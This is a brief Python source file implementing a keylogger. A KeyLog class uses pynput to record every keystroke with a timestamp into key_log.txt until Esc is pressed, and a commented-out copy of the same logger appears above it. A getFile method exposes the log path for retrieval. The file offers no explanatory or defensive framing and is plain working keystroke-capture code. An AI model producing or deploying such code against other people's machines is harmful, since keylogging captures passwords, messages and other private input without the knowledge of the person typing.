from pynput.keyboard import Key, Listener

import logging

# # make log file
# log_dir = ""
#
# logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')
#
#
# def on_press(key):
#     logging.info(str(key))
#     if key == Key.esc:
#         return False
#
#
# with Listener(on_press=on_press) as listener:
#     listener.join()


class KeyLog:
    def __init__(self):
        self.log_dir = ""

    def activateLogging(self):
        logging.basicConfig(filename=(self.log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

        def on_press(key):
            logging.info(str(key))
            if key == Key.esc:
                return False

        with Listener(on_press=on_press) as listener:
            listener.join()

    def getFile(self):
        return self.log_dir + "key_log.txt"

